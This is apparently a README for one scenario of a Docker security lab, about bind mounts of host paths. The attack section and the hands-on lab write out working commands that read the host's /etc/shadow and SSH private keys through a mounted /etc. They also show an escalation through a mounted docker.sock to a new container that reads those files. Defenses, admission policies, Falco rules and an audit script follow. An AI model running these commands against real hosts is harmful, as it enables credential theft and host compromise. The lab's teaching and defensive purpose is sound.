# Scenario 4: Host Path Mounts — When /etc Becomes the Attack Surface

## Overview

This scenario demonstrates how `-v` bind mounts turn ordinary host directories into attack surfaces inside containers. Unlike `--privileged` or `CAP_SYS_ADMIN`, bind mounts require no special flags or elevated capabilities — any `docker run` command can mount host paths. The attack starts with a single volume flag and escalates through `docker.sock` to full host compromise.

**Attack Complexity:** Low  
**Detection Difficulty:** Medium  
**Prevalence:** Very Common (logging, config sharing, CI/CD pipelines)  
**Impact:** Critical (credential theft, privilege escalation chain)

## Table of Contents

1. [Understanding Bind Mounts](#understanding-bind-mounts)
2. [Why Teams Mount Host Paths](#why-teams-mount-host-paths)
3. [Attack Demonstrations](#attack-demonstrations)
4. [Defense Strategies](#defense-strategies)
5. [Hands-On Lab](#hands-on-lab)
6. [Detection and Monitoring](#detection-and-monitoring)

---

## Understanding Bind Mounts

### What Is a Bind Mount?

A bind mount maps a directory or file on the host directly into the container's filesystem. The container process sees it as a normal path, but reads and writes go straight to the host.

```bash
# This mounts the host's /etc directory at /host-etc inside the container
docker run -v /etc:/host-etc alpine ls /host-etc/
# Output: host's actual /etc contents
```

The key distinction from Docker volumes is that bind mounts use an **existing host path**. Docker volumes create a managed directory under `/var/lib/docker/volumes/`. Bind mounts bypass that entirely.

### Why Bind Mounts Are Different From Other Escapes

Scenarios 2 and 3 require elevated privileges — `--privileged` or `CAP_SYS_ADMIN`. Bind mounts require neither. Any user with `docker run` access can mount host paths. This makes them the most **accessible** escape vector in this lab, and the most commonly overlooked in security reviews.

### What the Container Actually Sees

```bash
# Start container with /etc mounted
docker run -dit --name demo -v /etc:/host-etc alpine sleep 60

# Inside the container, /host-etc is indistinguishable from a local directory
docker exec demo ls /host-etc/
# passwd  shadow  ssh  ssl  hosts  hostname  ...

# But it's the HOST's /etc — live, writable, real
docker exec demo cat /host-etc/hostname
# Output: your actual host's hostname
```

---

## Why Teams Mount Host Paths

### Common Justifications

#### 1. Sharing Application Configuration
```bash
# Mount app config from host into container
docker run -v /opt/myapp/config:/app/config myapp:latest
```
**Developer reasoning:** "Config lives on the host, container needs to read it."  
**Reality:** ConfigMaps or Secrets in Kubernetes, or baking config into the image, eliminate this mount entirely.

#### 2. Log Collection
```bash
# Mount host log directory so a log shipper can read application logs
docker run -v /var/log:/host-logs log-shipper:latest
```
**Developer reasoning:** "The log agent needs to read logs from all containers."  
**Reality:** Docker's logging drivers handle this at the daemon level — no host mount needed.

#### 3. Sharing Docker Socket for CI/CD
```bash
# CI container needs to build images — mount the socket
docker run -v /var/run/docker.sock:/var/run/docker.sock ci-builder:latest
```
**Developer reasoning:** "The build pipeline needs Docker-in-Docker."  
**Reality:** Rootless builders (Kaniko, Buildah, BuildKit) eliminate socket mounts in CI entirely.

#### 4. Development Convenience
```bash
# Mount source code for live reload during development
docker run -v $(pwd):/app node:latest npm start
```
**Developer reasoning:** "I want code changes reflected immediately."  
**Reality:** This is the one legitimate common case — but source code directories should never contain credentials, and this pattern should never reach production.

### The Problem

Host path mounts are so routine that they rarely trigger security scrutiny. A container mounting `/etc` for "configuration access" looks identical to a container mounting `/opt/app/config`. The difference — one exposes password hashes, SSH keys, and system configuration — is invisible without an audit.

---

## Attack Demonstrations

### Prerequisites

```bash
# Ensure you're in the scenario directory
cd labs/09-runtime-escape/scenario-4-host-mount

# Make scripts executable
chmod +x *.sh
```

### Attack 1: /etc Bind Mount — Reading Host Credentials

**Scenario:** A container mounts the host's `/etc` directory. From inside the container, it reads `/etc/shadow` (password hashes), `/etc/passwd` (user accounts), and SSH host keys.

**Setup:**
```bash
docker run -dit --name mount-etc -v /etc:/host-etc alpine sleep 60
```

**Attack:**
```bash
# Step 1: Read /etc/passwd — user accounts and shells
docker exec mount-etc cat /host-etc/passwd
# Output: root:x:0:0:root:/root:/bin/bash
#         daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
#         ...

# Step 2: Read /etc/shadow — password hashes (the real target)
docker exec mount-etc cat /host-etc/shadow
# Output: root:$6$rounds=5000$saltsalt$hash:18000:0:99999:7:::
#         (or permission denied on Docker Desktop — see note below)

# Step 3: Read SSH host keys
docker exec mount-etc cat /host-etc/ssh/ssh_host_rsa_key 2>/dev/null
# Output: -----BEGIN RSA PRIVATE KEY-----
#         (or "No such file" on macOS — SSH keys live on the macOS host, not the VM)

# Step 4: Read SSL certificates and keys
docker exec mount-etc sh -c 'ls /host-etc/ssl/'
# Output: certs/  private/  ...

# Step 5: Enumerate what's available for further targeting
docker exec mount-etc sh -c 'find /host-etc -type f -name "*.key" -o -name "*.pem" -o -name "*shadow*" -o -name "*.conf" 2>/dev/null | head -20'
```

**Docker Desktop note:** On macOS, Docker Desktop runs containers inside a Linux VM. The `/etc` you mount is the VM's `/etc`, not your macOS system. `/etc/shadow` may be restricted by the VM's permissions. On a Linux host, the attack works as written and `/etc/shadow` is readable when the container runs as root.

**Why this matters:** An attacker who can read `/etc/shadow` can crack password hashes offline. Combined with `/etc/passwd` (which shows which users have shells), this is a direct path to host credential compromise.

**Cleanup:**
```bash
docker rm -f mount-etc
```

---

### Attack 2: docker.sock via Bind Mount — The Escalation Chain

**Scenario:** A container receives `docker.sock` via a bind mount. It uses the socket to create a **new container** that mounts `/etc`. The original container never needs `--privileged` — the socket does the escalation.

This is different from Scenario 1, where `docker.sock` is the initial entry point. Here, the socket is the **escalation target** — an attacker who has already gained access to a container with a socket mount uses it to pivot to host-level access.

**Setup:**
```bash
docker run -dit \
    --name mount-sock \
    -v /var/run/docker.sock:/var/run/docker.sock \
    alpine sleep 60
```

**Attack:**
```bash
# Step 1: Verify the socket is accessible
docker exec mount-sock ls -la /var/run/docker.sock
# Output: srwxr-xr-x 1 root root 0 Jan 28 10:00 /var/run/docker.sock

# Step 2: Install Docker CLI inside the container (or use a pre-built image)
docker exec mount-sock apk add -q docker 2>/dev/null

# Step 3: Use the socket to create a NEW container that mounts /etc
docker exec mount-sock docker run --rm -v /etc:/host-etc alpine cat /host-etc/passwd
# Output: Host /etc/passwd contents

# Step 4: The escalation chain is complete:
#   mount-sock (has docker.sock) → creates new container → reads /etc/shadow
docker exec mount-sock docker run --rm -v /etc:/host-etc alpine cat /host-etc/shadow
# Output: Host password hashes
```

**The chain in full:**
```
Container A (has docker.sock mounted)
    └── Uses socket to create Container B
        └── Container B mounts /etc from host
            └── Container B reads /etc/shadow
```

Container A never had `--privileged`. It only had a socket mount. But that single mount is enough to create Container B with arbitrary host access. This is why socket mounts are classified as a critical risk even when the container itself looks benign.

**Docker Desktop note:** On macOS, the socket may not be present at `/var/run/docker.sock` because Docker Desktop uses a different IPC mechanism. On a Linux host, this attack works end-to-end.

**Cleanup:**
```bash
docker rm -f mount-sock
```

---

## Defense Strategies

### Defense 1: Use Kubernetes-Native Volumes

Replace host path mounts with volumes that Docker and Kubernetes manage.

#### ConfigMap for Configuration Files
```yaml
# Instead of -v /opt/config:/app/config
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  app.yaml: |
    database:
      host: db.internal
      port: 5432
---
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: myapp:latest
    volumeMounts:
    - name: config
      mountPath: /app/config
      readOnly: true
  volumes:
  - name: config
    configMap:
      name: app-config
```

#### Secret for Credentials
```yaml
# Instead of -v /etc/ssl:/app/certs
apiVersion: v1
kind: Secret
metadata:
  name: app-tls
type: kubernetes.io/tls
data:
  tls.crt: <base64-encoded-cert>
  tls.key: <base64-encoded-key>
---
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    volumeMounts:
    - name: tls
      mountPath: /app/certs
      readOnly: true
  volumes:
  - name: tls
    secret:
      secretName: app-tls
```

#### emptyDir for Temporary Storage
```yaml
# Instead of -v /tmp/shared:/shared
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 100Mi
```

---

### Defense 2: Block docker.sock Mounts at Admission Time

#### Kyverno Policy
```yaml
# File: artifacts/kyverno-block-host-mounts.yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-host-path-mounts
  annotations:
    policies.kyverno.io/title: Restrict Host Path Mounts
    policies.kyverno.io/severity: critical

spec:
  validationFailureAction: enforce
  background: true

  rules:
  - name: check-host-path-mounts
    match:
      any:
      - resources:
          kinds:
          - Pod

    validate:
      message: >-
        Mounting sensitive host paths is not allowed.
        Use ConfigMap, Secret, or emptyDir volumes instead.
      pattern:
        spec:
          volumes:
          - X-(hostPath):
              path: "?(/allowed-path/*)"
```

#### Pod Security Standards
```yaml
# The "restricted" profile blocks hostPath volumes entirely
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
```

---

### Defense 3: Docker Daemon Hardening

```json
{
  "no-new-privileges": true,
  "userns-remap": "default"
}
```

With `userns-remap`, even if a container reads `/etc/shadow` via a bind mount, it reads it as a remapped UID — the file permissions on the host prevent access for the remapped user. This is the most effective single daemon-level defense against bind mount credential theft.

---

### Defense 4: Runtime Monitoring

See `artifacts/falco-host-mount-rules.yaml` (generated by `defense.sh`) for rules that detect:
- Access to sensitive host paths via bind mounts
- Docker socket access from containers
- Container escalation chains (docker CLI execution inside containers)
- Shadow file reads from any path

---

## Hands-On Lab

### Quick Start

Run the automated demonstration:
```bash
./demo.sh
```

This will:
1. Demonstrate `/etc` bind mount — read passwd, shadow, SSH keys
2. Demonstrate docker.sock escalation chain — mount socket, create new container, read credentials
3. Show the audit script detecting bind mounts in real containers

### Manual Step-by-Step

#### Step 1: Mount and Read /etc

```bash
# Mount host /etc, read credentials
docker run --rm -v /etc:/host-etc alpine sh -c '
echo "=== passwd ==="
cat /host-etc/passwd | head -5
echo
echo "=== shadow ==="
cat /host-etc/shadow 2>/dev/null || echo "(permission denied)"
'
```

#### Step 2: Test the Escalation Chain

```bash
# Mount docker.sock, create a new container from inside
docker run -dit --name chain-test -v /var/run/docker.sock:/var/run/docker.sock alpine sleep 60
docker exec chain-test docker run --rm -v /etc:/host-etc alpine cat /host-etc/passwd
docker rm -f chain-test
```

#### Step 3: Run the Audit

```bash
# Implement defenses (generates audit script)
./defense.sh

# Run the audit against your Docker host
./artifacts/audit-host-mounts.sh
```

#### Step 4: Validate Defenses

```bash
./validate.sh
```

#### Step 5: Cleanup

```bash
./cleanup.sh
```

---

## Detection and Monitoring

### Audit Script: Scan for Bind Mounts

The audit script (`artifacts/audit-host-mounts.sh`) classifies bind mounts by risk level:

| Risk Level | Paths | Why It Matters |
|---|---|---|
| CRITICAL | `/var/run/docker.sock`, `/` | Full host access or container creation |
| HIGH | `/etc`, `/root`, `/home` | Credential theft, SSH key exposure |
| MEDIUM | `/proc`, `/sys`, `/usr`, `/bin` | System reconnaissance, binary tampering |

```bash
chmod +x artifacts/audit-host-mounts.sh
./artifacts/audit-host-mounts.sh

# Example output:
# 🚨 FOUND: log-shipper [HIGH]
#   Image:       fluent/fluentd:latest
#   Mount:       /var/log → /host-logs
#   Risk:        System path (/var/log)
#
# 🚨 FOUND: ci-builder [CRITICAL]
#   Image:       myregistry/builder:latest
#   Mount:       /var/run/docker.sock → /var/run/docker.sock
#   Risk:        Docker socket — enables container creation/escalation
```

### Falco Rules

The Falco rules in `artifacts/falco-host-mount-rules.yaml` cover four detection scenarios:

1. **Sensitive host path access** — fires when a container reads files under bind-mounted paths like `/host-etc`
2. **Docker socket access** — fires when any container opens `/var/run/docker.sock`
3. **Escalation chain detection** — fires when a container executes `docker run` (indicating it's using a mounted socket to create containers)
4. **Shadow file reads** — fires on any read of a file named `shadow`, regardless of the mount path used

### Continuous Monitoring

- Alert on any new container with a bind mount to `/etc`, `/root`, `/home`, or `/var/run/docker.sock`
- Alert on `docker` CLI execution inside containers
- Weekly automated bind mount audit via `audit-host-mounts.sh`
- Monthly review of all hostPath volume usage across the cluster

---

## Summary

### Key Takeaways

1. **Bind mounts need no special privileges**
   - Any `docker run` command can mount host paths
   - No `--privileged`, no capability additions required
   - This is why they're the most commonly overlooked escape vector

2. **The escalation chain is the real danger**
   - A socket mount alone doesn't read credentials
   - But a socket mount enables creating new containers that do
   - The chain: socket mount → new container → host path mount → credential theft

3. **Detection requires active auditing**
   - Docker does not warn or restrict which host paths can be mounted
   - `docker inspect` shows mounts, but nobody runs it in production without automation
   - The audit script makes this scan routine

4. **Kubernetes-native volumes eliminate the attack surface**
   - ConfigMaps replace config file mounts
   - Secrets replace credential file mounts
   - emptyDir replaces temp directory mounts
   - Pod Security Standards block hostPath volumes entirely

### Production Checklist

- [ ] Audit all containers for bind mounts (run `audit-host-mounts.sh`)
- [ ] Flag any mount of `/etc`, `/root`, `/home`, or `/var/run/docker.sock`
- [ ] Replace host path mounts with ConfigMap/Secret/emptyDir where possible
- [ ] Block `docker.sock` mounts via admission policy
- [ ] Enable `userns-remap` in daemon config
- [ ] Deploy Falco rules for bind mount monitoring
- [ ] Apply Pod Security Standards `restricted` profile to production namespaces
- [ ] Re-audit monthly

---

## References

- [Docker Bind Mounts Documentation](https://docs.docker.com/engine/storage/bind-mounts/)
- [Kubernetes Pod Security Standards — Restricted Profile](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [CIS Docker Benchmark — Section 5.2](https://www.cisecurity.org/benchmarks/docker)
- [OWASP Container Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

---

## Lab Files

- `demo.sh` — Automated attack demonstrations (3 demos)
- `defense.sh` — Defense implementation (Falco rules, audit script, admission policy)
- `cleanup.sh` — Remove all lab artifacts
- `validate.sh` — Verify defenses are active
- `artifacts/audit-host-mounts.sh` — Production bind mount audit script
- `artifacts/falco-host-mount-rules.yaml` — Runtime detection rules
- `artifacts/kyverno-block-host-mounts.yaml` — Admission policy

---

**Next Scenario:** [Scenario 5: /proc and /sys Exposure](../scenario-5-proc-sys/)  
**Previous Scenario:** [Scenario 3: CAP_SYS_ADMIN](../scenario-3-sys-admin/)  
**Main Lab:** [Lab 09: Runtime Escape](../)  
**Repository:** [docker-security-practical-guide](https://github.com/opscart/docker-security-practical-guide)